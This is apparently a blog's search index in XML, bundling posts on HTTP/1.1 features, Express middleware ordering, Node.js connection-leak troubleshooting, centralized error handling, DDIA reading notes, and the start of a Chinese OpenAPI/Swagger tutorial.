<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Demystifying Advanced HTTP 1.1]]></title>
    <url>%2Fexperience%2Fpractice%2Fdemysifying-advanced-http%2F</url>
    <content type="text"><![CDATA[The Hypertext Transfer Protocol (HTTP) is the foundation of data communication on the web. Although HTTP/1.1 has been a standard since 1997, many web developers don’t fully utilize its advanced features for optimized performance. In this post, I’ll explain some key capabilities in HTTP 1.1 and how to leverage them. HTTP History Persistent ConnectionsPerformance issues from Non-persistent connection? In the early days of HTTP, each request would open a new TCP connection, introduce handshake delays, and accumulate TIME_WAIT sockets after closing. HTTP 1.1 introduced persistent connections through the Connection header with “keep-alive” value. This allows multiple requests/responses to reuse one TCP connection: Benefits include: Avoiding TCP handshake overhead Preventing port exhaustion via too many TIME_WAIT sockets Enabling request pipelining How to segment messages in a persistent connection? Request PipeliningBefore HTTP 1.1, each request had to wait for the prior response before being sent. This led to significant delays and underutilization of the TCP connection. Pipelining allows the client to make multiple requests over a single connection without waiting for each response. This results in much better utilization of available network bandwidth. Chunked Transfer EncodingCalculating the Content-Length header before sending response data introduces delays in first byte delivery. Chunked transfer encoding was introduced to avoid this. With chunked encoding, the server can begin sending data before knowing the total length. The body is sent in “chunks” with their own length: This allows response streaming without a pre-calculated content length. Powerful CachingCaching improves performance by reducing redundant requests. HTTP 1.1 has rich caching capabilities through ETags, Cache-Control, and Conditional Requests. ETags uniquely identify versions of resources. Cache-Control headers tell proxies how to cache responses. Conditional GETs with If-None-Match headers check the ETag to validate caches. This enables robust caching of both static and dynamically generated content: ConclusionHTTP 1.1 provides big performance wins over earlier versions through persistent connections, pipelining, chunked transfer encoding, and caching. Modern web developers should understand these features to optimize web and API performance. Let me know if you would like me to expand or modify anything in this initial draft! I’m happy to revise it based on your feedback.]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Practice</tag>
        <tag>HTTP/1.1</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Best Practices for Express Middleware Management]]></title>
    <url>%2Fexperience%2Fpractice%2Fmiddleware-installation-in-practice%2F</url>
    <content type="text"><![CDATA[When structuring Express apps, middleware play a crucial role in handling cross-cutting concerns like logging, security, and error handling. However, as our middleware chain grows, managing the installation order can quickly become messy. In this post, I’ll go over a few patterns for installing Express middleware - from simple to more advanced - and discuss the pros and cons of each approach. The goal is to provide some ideas and best practices to keep our middleware pipeline maintainable as our app grows. Practice 1: Installing Middleware SequentiallyThis approach installs middleware by specifying each one sequentially in code: 1234app.use(cors());app.use(bodyParser.json());app.use(bodyParser.urlencoded(&#123; extended: true &#125;));app.use(routes); This loads the middleware in a predefined order, which works for simple use cases. However, this approach has some downsides: The middleware loading order is inflexible. Dependencies between middleware aren’t handled automatically. It makes it harder to share middleware configuration across projects. There’s no central place to see what middleware is in use. It doesn’t facilitate configuration per environment. Testing middleware in isolation is more difficult. Practice 2: Installing Middleware by PriorityWhile installing middleware sequentially directly in code is simple, it can quickly become unmanageable for larger apps. To add more structure, we can define middleware priorities and install them in a sorted order based on those priorities. This allows us to control the middleware loading order more granularly. This approach assigns a priority to each middleware and installs them sorted by priority: Define middleware priorities: 123456const MiddlewarePriority = &#123; Logging: 1, BodyParser: 2, Helmet: 3, ErrorHandler: 4,&#125;; Register middleware with priorities: 123456const middlewares = new Map();middlewares.set(MiddlewarePriority.Logging, loggingMiddleware);middlewares.set(MiddlewarePriority.BodyParser, bodyParserMiddleware);middlewares.set(MiddlewarePriority.Helmet, helmetMiddleware);middlewares.set(MiddlewarePriority.ErrorHandler, errorHandlerMiddleware); Install middleware in priority order: 123456789function installMiddlewares(middlewaresMap) &#123; const sortedMiddlewares = [...middlewaresMap] .sort((a, b) =&gt; a[0] - b[0]) .map((m) =&gt; m[1]); sortedMiddlewares.forEach((middleware) =&gt; &#123; app.use(middleware); &#125;);&#125; Drawbacks: Hard to add new middleware between priorities (e.g. CORS after BodyParser). No unused priority values. Priorities could become out of sync if new middleware added. Still need to register middleware in code. Practice 3: Topological Sorting for Middleware OrderingWhile defining middleware priorities allows more control over ordering than installling sequentially, it still has limitations when new middleware needs to be added between existing priorities. This leads us to a more flexible approach - modeling middleware as a directed graph based on before/after dependencies and topologically sorting to resolve the order. This avoids priority conflicts altogether by letting us explicitly declare dependencies separately from the installation code. Now middleware can be added without worrying about priorities or order - the graph handles it automatically. Transitioning to this dependency graph approach allows our middleware configuration to be much more extensible. This approach defines middleware dependencies and installs them in a valid order using topological sorting: Define middleware and dependencies: 1234567891011121314151617181920const middlewares = [ &#123; id: "logging", before: [], after: ["bodyParser"], mw: loggingMiddleware, &#125;, &#123; id: "bodyParser", before: ["logging"], after: ["helmet"], mw: bodyParserMiddleware, &#125;, &#123; id: "helmet", before: ["bodyParser"], after: ["routes"], mw: helmetMiddleware, &#125;,]; Build dependency graph: 123456789101112131415161718function getMw(id) &#123; return middlewares.find((mw) =&gt; mw.id === id);&#125;const depGraph = new Graph();middlewares.forEach((mw) =&gt; &#123; depGraph.addVertex(mw); mw.after.forEach((afterId) =&gt; &#123; const afterMw = getMw(afterId); depGraph.addEdge(afterMw, mw); &#125;); mw.before.forEach((beforeId) =&gt; &#123; const beforeMw = getMw(beforeId); depGraph.addEdge(mw, beforeMw); &#125;);&#125;); Topologically sort graph and install middleware: 12345const sortedMws = depGraph.topologicalSort();sortedMws.forEach((mw) =&gt; &#123; app.use(mw.middleware);&#125;); This allows complete control over middleware ordering while avoiding priority conflicts. Middleware and dependencies are declared separately from app code. The key is implementing the Graph class with addVertex, addEdge and topologicalSort methods. There is an example of the directed graph implementation for the reference: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748interface IVertex &#123; id: string;&#125;class Graph &#123; vertices: IVertex[]; adjList: Map&lt;IVertex, IVertex[]&gt;; constructor() &#123; this.vertices = []; this.adjList = new Map(); &#125; addVertex(v: IVertex): void &#123; this.vertices.push(v); this.adjList.set(v, []); &#125; addEdge(v: IVertex, w: IVertex): void &#123; this.adjList.get(v)!.push(w); &#125; topologicalSort(): IVertex[] &#123; const visited = new Set&lt;IVertex&gt;(); const stack: IVertex[] = []; for (let v of this.vertices) &#123; if (!visited.has(v)) &#123; this.dfs(v, visited, stack); &#125; &#125; return stack.reverse(); &#125; dfs(v: IVertex, visited: Set&lt;IVertex&gt;, stack: IVertex[]) &#123; visited.add(v); const neighbors = this.adjList.get(v)!; for (let w of neighbors) &#123; if (!visited.has(w)) &#123; this.dfs(w, visited, stack); &#125; &#125; stack.push(v); &#125;&#125; SummaryIn summary, there are a few different ways to handle middleware installation. Doing it directly in code is quick but can get messy. Defining priorities helps control order but still has conflicts. Modeling dependencies as a graph and topology sorting gives the most flexibility as apps grow larger. The key is separating the middleware declarations from the installation logic. This allows new middleware to be added without fussing with order. Hope this gives some ideas on managing middleware setup!]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Middleware</tag>
        <tag>Graph</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Troubleshooting in Practice - connection leak detection as an example]]></title>
    <url>%2Fexperience%2Fpractice%2Ftroubleshooting-in-practice%2F</url>
    <content type="text"><![CDATA[IntroductionAs of the writing time, I have been working for over five years. In recent years, with the gradual accumulation of work experience, more and more colleagues and peers have approached me for help in solving challenging problems, such as Node.js memory leak detection, database connection pool leak detection (where connections are held for a long period), performance optimization, deadlock detection, among others. Today, I will use database connection pool leak detection as an example to summarize a set of approaches for troubleshooting complex issues for future reference - my best practices to troubleshooting. Overall, my approach to analyzing complex issues can be broken down into eight steps. Step 1: Define ProblemThe first and most crucial step in troubleshooting is to precisely define the problem. Start by gathering information about the issue. In the case of connection leak detection, The response was very slow, even with no response from Gateway but a 503 HTTP status code was responded. This is the definition of our problem which is very straightforward. Step 2: Gather InformationThe low response comes from kinds of possibilities. No hurry to investigate it immediately. Instead, to understand the problem better, we should collect as much information as possible. This may include environment, code version, logs, error messages, etc. In our scenario, we found there was an endpoint /metrics timeout from the logs. There wasn’t further information except for db connection failed to acquire. That means db connection pool was full always. We suspected some connections never had been released after used. We developed a detection algorithm in order to gather more logs about connection leak as below: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849const connectionMap = new WeakMap&lt;Connection, IConInfo&gt;();export function registerForLeaks(label: string, con: Connection, stackErr?: Error) &#123; if (connectionMap.has(con)) &#123; // already register return; &#125; const info: IConInfo = &#123; id: uuid(), stackErr, &#125;; Error.captureStackTrace(info, registerForLeaks); // capture stack excluding current function const warnAfterUnusedMs: number = (process.env.DB_LEAK_WARN_AFTER_UNUSED &amp;&amp; parseInt(process.env.DB_LEAK_WARN_AFTER_UNUSED, 10)) || TimeUnit.MINUTES.toMillis(30); const intervalMs: number = (process.env.DB_LEAK_INTERVAL_CHECK &amp;&amp; parseInt(process.env.DB_LEAK_INTERVAL_CHECK, 10)) || TimeUnit.MINUTES.toMillis(1); const interval = setInterval(() =&gt; &#123; if (!connectionMap.has(con)) &#123; clearInterval(interval); return; &#125; const unusedSinceMs = Date.now() - (info.lastUsedTimeStamp || info.connectionTimestamp); // Remove check after leak detection if (unusedSinceMs &gt; warnAfterUnusedMs) &#123; logError( `[$&#123;label&#125;] probable connection leak detected with connection id: $&#123;info.id&#125;, unused since $&#123;TimeUnit.MILLISECONDS.toMinutes(unusedSinceMs)&#125; mins`, ); clearInterval(interval); map.delete(con); &#125; &#125;, intervalMs); connectionMap.set(con, info); con.on('connected', (evt) =&gt; &#123; info.connectionTimestamp = Date.now(); logDebug(`[$&#123;label&#125;] connected $&#123;info.id&#125; $&#123;info.connectionTimestamp&#125;`); &#125;); con.on('disconnected', (evt) =&gt; &#123; connectionMap.delete(evt.connection); clearInterval(interval); &#125;); con.on('executed', (evt) =&gt; &#123; info.lastUsedTimeStamp = Date.now(); &#125;); con.on('prepared', (evt) =&gt; &#123; info.lastUsedTimeStamp = Date.now(); &#125;);&#125; Step 3: Reproduce ProblemBefore we diagnose the issue, much better if we were able to replicate it consistently. Reproducing the problem allows us to work with a controlled environment. To be able to narrow down the scope of the investigation. Step 4: Investigate Root CauseNow that we’ve reproduced the problem, it’s time to analyze the data we’ve collected. Look for patterns, anomalies, and potential causes. Identifying the root cause is often the most challenging part of troubleshooting. We could follow the pattern ISOLATE-INVESTIGATE-VALIDATE to find the root cause in the end. In our scenario, we found there was an endpoint /metrics timeout from the logs Then we confined the investigation scope to /metrics endpoint turned out there were actually lots of history logs pointed to this endpoint. Dug into more logs of metric endpoint, we found the connection acquired by retriveErrorLocalizedStrings had never been released. Looking at the corresponding code, we noticed a new connection was acquired occasionally for a new task in retriveErrorLocalizedStrings, but never released. Step 5: Fix ProblemOnce we’ve identified the root cause, it’s time to fix the problem. This might involve writing code to address the issue, reconfiguring system settings, or applying a patch. Step 6: Validate SolutionAfter implementing your fix, it’s essential to validate the solution. Test our application again to ensure the problem no longer occurs. Step 7: Recap and ProtectionTroubleshooting shouldn’t end with the issue resolution. Take the time to recap what you’ve learned from the experience. Document the problem, the root cause, and the solution we applied. Consider implementing protective measures to prevent similar issues in the future.In this example, we Fixed the problem Enhanced connection lifecycle management: executeWithNewConnection 1234567891011121314151617181920export async function executeWithNewConnection&lt;T&gt;( connection: Connection, task: Task&lt;T&gt;, taskName?: string): Promise&lt;T&gt; &#123; const localTaskName = getTaskName(taskName) const newConnection = createNewConnection(connection) return run(newConnection, task, localTaskName)&#125;async function run&lt;T&gt;(newConnection: Connection, task: Task&lt;T&gt;, taskName: string): Promise&lt;T&gt; &#123; try &#123; const result = await task(newConnection) return result &#125; catch (err: any) &#123; throw err &#125; finally &#123; await newConnection.finish() &#125;&#125; Whenever the task is run either successfully or failed, we finish the new connection. This means the lifecycle of this newly created connection was totally controlled. Step 8: Knowledge TransferThe final step is to transfer knowledge to our team and other relevant stakeholders. Share our experience and the steps we took to resolve the issue. This not only fosters a culture of continuous improvement but also empowers our team to handle similar problems in the future.]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Practice</tag>
        <tag>Troubleshooting</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Error Handling in Practice - Centralizing Operational Errors in Node.js]]></title>
    <url>%2Fexperience%2Fpractice%2Ferror-handling-in-practice%2F</url>
    <content type="text"><![CDATA[IntroductionIn the ever-evolving realm of software development, errors and exceptions are constant companions. These errors can be broadly categorized into two types: programming errors and operational errors. While programming errors are typically caught during development and testing phases, operational errors are the real-world hurdles that applications must gracefully navigate in production environments. In this blog, we will shine a spotlight on the art of handling operational errors and delve into the pivotal role played by a central error class in Node.js. Operational Errors: Navigating the Real-World ChallengesOperational errors are a natural part of any software application’s lifecycle. They can arise from various sources, including network issues, database failures, external service unavailability, and even user input. In a typical Node.js application, these errors can occur at different layers, such as the controller, service, and database access (Dao) layers. Handling these errors effectively is crucial for maintaining application reliability and providing a smooth user experience. The Central Error Class: One for AllIn the world of Node.js, it’s a common practice to employ a central error class to manage operational errors efficiently. This central error class serves as a hub for creating, formatting, and handling errors in a structured and consistent manner. By adhering to a single error class throughout your project, you can simplify error management and ensure uniformity in error responses. For instance, we have MyProjectError as an central error class. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283class MyProjectError extends Error &#123; public static UNKNOWN_ERROR_CODE = "99999"; /** The module in which the error occurred. */ private _module: string; /** A code to uniquely identify the error in a module. */ private _code: number | string; /** A unique id that identifies the error uniquely in the logs. */ private _guid: string; /** A http status code that is assigned to the error. */ private _statusCode: number; /** An array of error objects that lead to this error. Errors in causes do not have any causes themselves. */ protected _causes: MyProjectError[]; /** An optional message field for additional information. */ private _details?: string; /** The host on which the error occurred. */ private _host: string; /* Optional array of strings that are used to build the localization string */ private _i18nParameters: Array&lt;string&gt;; /** Key to localization string that will be looked up along with a language key */ private _i18nKey: string; /** * Create a new MyProjectError. * @param module - The module in which the error is thrown, e.g. x-glossary * @param code - The error code number, e.g. 22500. It's also possible to use a string, but this is discouraged! * @param message - The message that should be displayed with the error * @param i18nKey - internationalization key * @param i18nParameters - parameters for i18n translation * @param statusCode - A status code that can be used for the http response * @param causes - Additional errors that lead to this error * @param details - An optional message field for additional information * @param host - An optional indicator of the pod in which the error occured */ constructor( module: string, code: number | string, message: string, i18nParameters: Array&lt;string&gt; = [], i18nKey: string = "", statusCode: number = 500, causes: Array&lt;MyProjectError | Error&gt; = [], details?: string, host = hostname() ) &#123; super(`$&#123;message&#125;: $&#123;details&#125;`); this.message = message; this.name = "MyProjectError"; this._module = module; this._i18nParameters = i18nParameters; this._i18nKey = i18nKey; this._code = code || MyProjectError.UNKNOWN_ERROR_CODE; this._guid = uuidv4(); this._statusCode = statusCode; this._causes = MyProjectError.flatten( causes.map((_) =&gt; MyProjectError.wrap(_)) ); this._details = details; this._host = host; &#125; /** Returns the error as a JSON object. */ public toJSON(): JSON &#123; return &#123; message: this.message, code: this._code, module: this._module, guid: this._guid, statusCode: this._statusCode, causes: this._causes.map((_) =&gt; _.toJSON()), details: this._details, hostname: this._host, i18nParameters: this._i18nParameters, i18nKey: this._i18nKey, &#125;; &#125; /** Add a cause to the error. */ public addCause(err: MyProjectError | Error) &#123; this._causes.push(MyProjectError.wrap(err)); &#125;&#125; The MyProjectError class is a custom error class that extends the built-in Error class. It includes additional properties and methods to handle and format errors in a structured way. By using this error class, we are able to create and handle specific types of errors based on their characteristics.The MyProjectError class includes properties such as the module in which the error occurred, an error code, a unique identifier for the error, an HTTP status code, causes of the error, and additional details. It also provides methods to add causes to the error and convert the error to a JSON object.By using this error class, we can create consistent and standardized error objects, making error handling more structured and maintainable. Utilize Central Error ClassAround the central error class, we are able to utilize the error handling. 1. Unified Error CreationThe central error class allows developers to create and throw specific types of errors with ease. This consistency in error creation facilitates better communication between different layers of your application, ensuring that everyone speaks the same error language. 2. Send Error ResponsesWhen an operational error occurs, it’s essential to communicate the issue to the client in a clear and standardized way. The central error class enables you to generate error responses that adhere to a predefined structure, making it easier for clients to understand and handle errors gracefully. 3. Convert Unknown ErrorsNot all errors are predictable, and some may be unexpected or unfamiliar. In such cases, the central error class can help by converting these unknown errors into a generic format that can be handled more effectively. This approach ensures that your application can gracefully recover from unforeseen issues. 4. Localize/Translate Error MessagesIn a globalized world, catering to users with diverse language preferences is crucial. The central error class can be extended to include localization and translation features. This allows error messages to be presented to users in their preferred language, enhancing the overall user experience. For example, we throw the an error when ‘two tenant mode feature is not enabled’. 1throw ERRORS.twoTenantModeFeatureNotEnabled(targetTenantUuid, systemAction); The error is generated by function twoTenantModeFeatureNotEnabled 12twoTenantModeFeatureNotEnabled: (tenantUuid: string, systemAction: SystemAction): MyProjectError =&gt; create('10045', 'errOdc04045', [systemAction, tenantUuid], 400) The function create is the single entry point to create an error that instances of MyProjectError. It receives an error code, an error message localization key, a set of parameters for translation, and an HTTP response code. In the localization properties, we have the definition of errOdc04045 for building an error message. 123#YMSE: &#123;0&#125; is the action name of the system#YMSE: &#123;1&#125; is the target system to create/restore.errOdc04045=Cannot &#123;0&#125; the system &#123;1&#125; because two tenant mode is not enabled The error message is built during the serialization phase before sending it to clients. Error handling in Three Layers of backend serviceIn a typical backend architecture, your application may consist of three primary layers: the controller, service, and database access (Dao) layers. Each of these layers plays a role in processing requests and handling operational errors. Controller LayerThe controller layer serves as the entry point for incoming requests and plays a crucial role in error handling and response generation. e.g. we have the entry createSystems for POST /v1/systems to create a set of systems in batch as below. 1234567891011121314151617/** * Create a set of systems. Only BTP systems have been implemented so far. * @param req * @param res */export async function createSystems(req: Request, res: Response) &#123; try &#123; const serviceContext = await getServiceContext(req); const systemService = new SystemService(serviceContext); const systemsToCreate = getRequestBody &lt; ISystemsToCreate &gt; req.systems; await systemService.createSystems(systemsToCreate); res.status(201).end(); &#125; catch (error) &#123; await sendErrorResponse(req, res, error); &#125;&#125; Error handling in controller layerIn the provided code snippet, we see a global try-catch block wrapping the entry function of the controller. This approach ensures that any exceptions thrown during request processing are caught and handled gracefully. The controller is responsible for crafting and sending responses back to clients. In the provided code, HTTP status codes and appropriate responses are sent, ensuring a consistent and user-friendly experience. Handling errors isn’t just about catching exceptions; it’s also about providing meaningful error messages to clients. In the provided example, the need for localization of error messages is evident. The error messages need to be translated according to the client’s language preference. To achieve this, a translation search key, such as errOdc04044, is used to retrieve the correct localized text. This localization information is crucial for delivering a user-centric experience, especially in applications with a global user base. Service LayerThe service layer is where complex business logic resides. It involves tasks such as data validation, interaction with the database, and building output data. In this layer, error handling is equally critical. 12345678910111213141516171819202122public async createSystems(systemsToCreate: SystemToCreate[]) &#123; try &#123; const systemsAndConnectionsToCreateDb = await ServiceHelper.buildSystemsAndConnectionsToCreateDb( this.context.requestContext, systemsToCreate ); const affectedSystems = await this.saveSystemsAndConnections(systemsAndConnectionsToCreateDb); await this.updateSearchView(); const btpSystemsToCreate: IBtpSystemToCreate[] = systemsToCreate.filter(ServiceHelper.isBtpSystem); if (btpSystemsToCreate.length &gt; 0) &#123; await this.syncUpTenantRelationshipsForCreation(btpSystemsToCreate); &#125; await this.context.client.commit(); trace.exiting(); return affectedSystems; &#125; catch (e) &#123; await this.context.client.rollback(); const error = tryToConvertToGenericError(e); throw error; &#125;&#125; Data Validation: Input data received from the controller must be validated and converted to a suitable format for processing. This step helps prevent invalid or malicious data from causing issues further down the line. Database Interaction: When interacting with the database, error handling is paramount. Database errors, network issues, or unexpected data inconsistencies can all lead to exceptions. Handling these exceptions gracefully ensures the integrity of the application. Output Data: After processing, the service layer is responsible for building and formatting the output data that will be sent back to the controller for response generation. Error handling in the service layerThe function in the service layer is wrapped in a global try-catch block. In this layer, errors can originate from utilities, helpers, or the database access layer. If an error is not recognized, it should be converted to a generic error. Database Access Layer (Dao)The database access layer is responsible for interacting with the database and handling errors that may arise during data retrieval or modification. 1234567891011private async saveSystemsAndConnections( systemsAndConnectionsToCreateDb: ISystemAndConnectionToCreateDb[]): Promise&lt;ISystemDb[]&gt; &#123; const affectedSystems = await this.sharedDBAccess.createSystemsAndConnections(systemsAndConnectionsToCreateDb); if (affectedSystems.length &gt; 1) &#123; throw ERRORS.duplicatedSystem() &#125; return _.merge(affectedSystems.createdSystems, affectedSystems.updatedSystems);&#125; The errors could come from this layer directly. We generate error by a unified entry point and throw it to the caller. We don’t need to cope with the error too much in this layer. However, we need a set of error utilities to generate the error easily. Conclusion: Streamlining Error Handling for a Reliable ApplicationIn software development, mistakes are not only hurdles but helpful tools for enhancing dependability and user experience. By adhering to recommended methods in managing mistakes, such as sending error responses, transforming unknown errors into a standard format, adopting a unified approach to creating errors, offering error categories, and localizing error messages, developers can build software systems that are more resilient and user-friendly. Embracing mistakes as a part of the development process can result in more robust and reliable applications that serve users better.]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Practice</tag>
        <tag>Error Handling</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DDIA reading notes - chapter 7 Transactions]]></title>
    <url>%2Ffundamental%2Fstorage%2Fddia-ch7-reading-notes%2F</url>
    <content type="text"><![CDATA[Chapter 6 of this book discusses Transactions. For decades, transactions have been the mechanism of choice for simplifying these issues. A transaction is a way for an application to group several reads and writes together into a logical unit. Conceptually, all the reads and writes in a transaction are executed as one operation: either the entire transaction succeeds (commit) or it fails(abort, rollback).Transactions are created with a purpose: to simplify the programming model for applications accessing a database. By using transactions, the application is free to ignore specific potential error scenarios and concurrency issues. Please refer to pdf to dive into the detailed notes.]]></content>
      <categories>
        <category>Fundamental</category>
        <category>storage</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>Transaction</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DDIA reading notes - chapter 6 Partitioning]]></title>
    <url>%2Ffundamental%2Fstorage%2Fddia-ch6-reading-notes%2F</url>
    <content type="text"><![CDATA[Chapter 6 of this book discusses the concept of data partitioning. The chapter explains how data partitioning can be used to improve the scalability and performance of distributed systems. The author describes various partitioning techniques and their advantages and disadvantages. The chapter also covers the challenges that arise when partitioning data, such as data skew and hotspots, and explains how to mitigate these issues. Overall, Chapter 6 provides a comprehensive overview of the partitioning strategies that can be used in modern distributed systems. Please refer to pdf to dive into the detailed notes.]]></content>
      <categories>
        <category>Fundamental</category>
        <category>storage</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>Partitioning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DDIA reading notes - chapter 5 Replication (Part II)]]></title>
    <url>%2Ffundamental%2Fstorage%2Fddia-ch5-reading-notes-ii%2F</url>
    <content type="text"><![CDATA[Last section of Chapter 5 is Leaderless Replication. Leaderless Replication is a different approach compared to Single Leader Replication and Multi-Leader Replication, abandoning the concept of a leader and allowing any replica to directly accept writes from clients. In some leaderless replication implementations, the client directly sends its writes to several replicas, while in others, a coordinator node does this on behalf of the client. This is the reading notes Leaderless Replication of DDIA. Please refer to pdf to dive into the detailed notes.]]></content>
      <categories>
        <category>Fundamental</category>
        <category>storage</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>Replication</tag>
        <tag>Leaderless</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DDIA reading notes - chapter 5 Replication (Part I)]]></title>
    <url>%2Ffundamental%2Fstorage%2Fddia-ch5-reading-notes-i%2F</url>
    <content type="text"><![CDATA[Chapter 5 of this book covers the important topic of replication in the context of database systems. Replication is the process of creating and maintaining multiple copies of the same database on different servers. This is done to ensure data availability, improve performance, and provide fault tolerance. The chapter starts by introducing the concept of replication and its benefits. It then goes on to explain the different types of replication, including master-slave, master-master, and multi-master replication. Each type is discussed in detail, with its advantages and disadvantages. The chapter also covers the different replication topologies, such as star, tree, and mesh. It explains how each topology works and when it is appropriate to use them. Next, the chapter discusses the issues related to replication, such as consistency, conflicts, and latency. It explains how these issues can be addressed using techniques such as locking, timestamping, and conflict resolution. Finally, the chapter concludes with a discussion on the challenges of replication and how they can be overcome. It also provides some best practices for designing and implementing replication systems. Please refer to pdf version to see more reading notes in detailed.]]></content>
      <categories>
        <category>Fundamental</category>
        <category>storage</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>Replication</tag>
        <tag>Replica</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DDIA reading notes - chapter 4 Encoding & Evolution]]></title>
    <url>%2Ffundamental%2Fstorage%2Fddia-ch4-reading-notes%2F</url>
    <content type="text"><![CDATA[This chapter focuses on the challenges of encoding and evolving data formats in distributed systems. The chapter begins by discussing how data formats can impact system design and evolution. It then explores two common approaches to data encoding: binary encoding and text encoding. Binary encoding is more efficient but less human-readable, while text encoding is less efficient but more human-readable. The chapter then delves into the challenges of data evolution, such as adding new fields or changing the format of existing fields. It explains how versioning and compatibility checks can be used to manage these challenges. Next, the chapter introduces several data encoding formats, including Protocol Buffers, Thrift, Avro, and JSON. It discusses the pros and cons of each format and their suitability for different use cases. Finally, the chapter concludes by emphasizing the importance of careful data encoding and evolution in distributed systems, as it can greatly impact the ability of the system to evolve and meet changing needs over time.Please refer to the pdf reading noted in detailed:]]></content>
      <categories>
        <category>Fundamental</category>
        <category>storage</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>Encoding</tag>
        <tag>Serialization</tag>
        <tag>Marshalling</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用 OpenAPI 设计 RESTful API (一)]]></title>
    <url>%2Fexperience%2Fpractice%2Frestful-api-design-along-with-swagger%2F</url>
    <content type="text"><![CDATA[0x00. OpenAPI 简介在之前的文章 Restful API 设计指导 中，我介绍了如何设计 Restful API。随着前后端的分离以及软件架构的复杂化，你是否也遇到过以下的一个或者多个问题呢？ API 的设计和实现并非同一个人。无论是在大型互联网架构中还是复杂的软件开发中，API 的设计往往是有架构师、资深工程师、PM 等这些经验丰富的人负责。一旦设计完成，才将具体的开发任务分配给相应的 API 开发工程师。 API 有完整的测试。越是复杂的产品，对产品的质量有越高的要求，一般而言会有专门的测试团队对 API 进行完整的自动化测试。 前端开发工程师（或者 API 的调用方）和 API 工程师协同开发，因此前端工程师需要 Mock API 以解除对 API 开发进度的依赖。 为了解决以上问题中，至少需要保证两点： API 的设计优先。 API 的设计结果需要在架构师、 API 开发工程师、测试工程师和前端工程师中清晰准确的传递。 OpenAPI 规范通过定义一种 API 规范旨在解决 API 的设计、开发、消费之间的信息传递问题。 The OpenAPI Specification, originally known as the Swagger Specification, is a specification) for machine-readable interface) files for describing, producing, consuming, and visualizing RESTful web services.[1] Originally part of the Swagger) framework, it became a separate project in 2016, overseen by the OpenAPI Initiative, an open-source collaboration project of the Linux Foundation.[2] Swagger and some other tools can generate code, documentation and test cases given an interface file. – from Wikipedia OpenAPI 规范截止目前共发布了 3 个大版本，目前主要使用的分别是 OpenAPI 3 和 Swagger 2，他们之间跟属性的差别如下： API 的定义支持 YAML 格式和 JSON 格式。以官方提供的基于 Swagger 2.0 的 Petstore API 设计方案为例， Swagger 2.0 版本常用的根属性（Fixed Field）有： 属性名 取值类型 描述 swagger string 定义 OpenAPI 规范的版本号， v2 版本取值必须是&quot;2.0&quot;. info Info Object API 的元数据信息。包括开发者信息，API 的概述，API 版本和版权等信息。 host string 定义 API 的访问域名。 basePath string 访问 API 时将此值做为 API 的前缀路径。 schemes [string] API 支持的通信协议， 包括 &quot;http&quot;, &quot;https&quot;, &quot;ws&quot;, &quot;wss&quot; 等一种或多种。 paths Paths Object 每个 API 的具体定义。 定义中包括 API 的端点（endpoint），参数类型，返回值类型。每个 API 端点的定义中，又以 API 的调用方法分组。 definitions Definitions Object 定义一个数据结构，一般将公用的数据模型定义在此处以供 API 的定义直接引用。 更多属性及其定义可以查看官方文档 OpenAPI V2.0。 0x01. SwaggerSwagger 是 OpenAPI 的实现，它提供了 API 设计、API 测试、可视化 API 的定义和 Mock API 数据等诸多功能。 Swagger 提供了一些开源组件，这些组件都是开源的。Swagger 官方把他们被集成到了 Swagger Hub 中供我们直接在线上使用，当然我们也可以单独将这些组件部署在我们的开发环境中： Swagger Codegen Swagger Codegen 可以将 API 的 OpenAPI 定义翻译成各种格式的接口文档，也可以生成各种编程语言的 SDK 代码。 Swagger Codegen can simplify your build process by generating server stubs and client SDKs for any API, defined with the OpenAPI (formerly known as Swagger) specification, so your team can focus better on your API’s implementation and adoption. Swagger Editor Swagger Editor 提供在线编辑，设计 API 的功能。 Design, describe, and document your API on the first open source editor fully dedicated to OpenAPI-based APIs. The Swagger Editor is an easy way to get started with the OpenAPI Specification (formerly known as Swagger), with support for Swagger 2.0 and OpenAPI 3.0. Swagger UI Swagger UI 将 API 的设计可视化，让 API 的消费者更加容易阅读 API 的定义和使用 API。 Swagger UI allows anyone — be it your development team or your end consumers — to visualize and interact with the API’s resources without having any of the implementation logic in place. It’s automatically generated from your OpenAPI (formerly known as Swagger) Specification, with the visual documentation making it easy for back end implementation and client side consumption. 0x02. 使用 Swagger 设计 API2.0 初识 Swagger Editor使用 Swagger 设计 API，首先要打开 Swagger Hub 或者 Swagger Editor。打开 Swagger Editor 后，默认会载入 Petstore 的 API 定义， 其中 Swagger Editor 集成了 Swagger UI，如右侧所示。左侧的区域 1 为 API 定义代码编辑器，右侧区域 2 为 API 的描述信息展示区，右侧区域 3 为 API 的定义可视化区，右侧区域 4 则为 API 引用的数据模型定义的可视化区。 在区域 2 中点击具体的某个 API，以 POST /user 为例，可以看到更多的 API 定义信息, 2.1 设计 GET /user 接口设计一个 GET /user 的接口用于返回用户列表，在 /user 下添加 get 方法，并有如下定义： 12345678910111213141516171819/user: get: tags: - "user" summary: "Get users with filltering" operationId: "getUser" consumes: - "application/json" produces: - "application/json" responses: 200: description: "successful operation" schema: type: "array" items: 